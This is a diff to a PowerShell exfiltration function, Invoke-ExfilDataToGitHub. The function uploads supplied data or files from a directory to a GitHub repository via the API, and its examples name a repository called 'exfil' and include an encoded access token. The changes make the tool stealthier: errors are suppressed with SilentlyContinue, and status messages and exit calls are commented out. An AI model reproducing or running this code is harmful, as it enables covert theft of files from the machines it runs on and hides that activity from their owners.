@@ -1,4 +1,4 @@
-function Invoke-ExfilDataToGitHub_GH
+function Invoke-ExfilDataToGitHub
 {
 
 <#
@@ -41,7 +41,7 @@ Data to write to file
 # This example exfiltrates data to a file
 
 Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y==" 
-                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -data "a bit of test data"
+                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -Data "a bit of test data"
 .EXAMPLE
 # This example exfiltrates files from a given directory and filter
 Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0Y=="
@@ -83,10 +83,6 @@ Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3Mz
         [Object]
         $Data = "test data"
 
-        #[switch]
-        #$Filter = $False
-
-
     )
 
 
@@ -119,14 +115,14 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
 
 
     Try {
-        $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction Stop
+        $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
          # If we get here that means we were able to get the contents so get hold of the sha
         $sha = $content.sha
         #Write-Host $sha
     }
     Catch {        
         $ErrorMessage = $_.Exception.Message;
-        Write-Host "Trying to get file contents: " + $ErrorMessage; # remove in production
+        #Write-Host "Trying to get file contents: " + $ErrorMessage; # remove in production
     }
 
    
@@ -143,11 +139,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         } | ConvertTo-Json;
 
         try {
-            Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction Stop
+            Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction SilentlyContinue
         }
         catch{
             $ErrorMessage = $_.Exception.Message;
-            Write-Host "Trying to delete file: " + $ErrorMessage; #remove in production
+            #Write-Host "Trying to delete file: " + $ErrorMessage; #remove in production
         }
     } 
 
@@ -160,13 +156,13 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         } | ConvertTo-Json;
        
         try{            
-            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction Stop
-            Write-Host "Successfully uploaded file!"
+            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
+            #Write-Host "Successfully uploaded file!"
         }
         catch{
             $ErrorMessage = $_.Exception.Message;
-            Write-Host "Trying to create file: " + $ErrorMessage;
-            exit
+            #Write-Host "Trying to create file: " + $ErrorMessage;
+            #exit
         }    
 
 
@@ -203,13 +199,13 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
             }
 
             Try {
-                $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction Stop
+                $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
                 # If we get here that means we were able to get the contents so get hold of the sha
                 $sha = $content.sha
             }
             Catch {      
                 $ErrorMessage = $_.Exception.Message;
-                Write-Host "Trying to get file contents: " + $ErrorMessage;
+                #Write-Host "Trying to get file contents: " + $ErrorMessage;
             }
 
             # Delete the file if it already exists
@@ -222,11 +218,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 } | ConvertTo-Json;
 
                 try {
-                    Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction Stop
+                    Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Delete -ErrorAction SilentlyContinue
                 }
                 catch{
                     $ErrorMessage = $_.Exception.Message;
-                    Write-Host "Trying to delete file: " + $ErrorMessage;
+                    #Write-Host "Trying to delete file: " + $ErrorMessage;
                 }
             } 
 
@@ -244,14 +240,14 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 message = "Commit at: " + (Get-Date);
             } | ConvertTo-Json
             
-            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction Stop
-            Write-Host "Successfully uploaded file!"
+            $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
+            #Write-Host "Successfully uploaded file!"
 
         }
         Catch {
             $ErrorMessage = $_.Exception.Message;
-            Write-Host "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
-            exit
+            #Write-Host "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
+            #exit
         }
 
     }
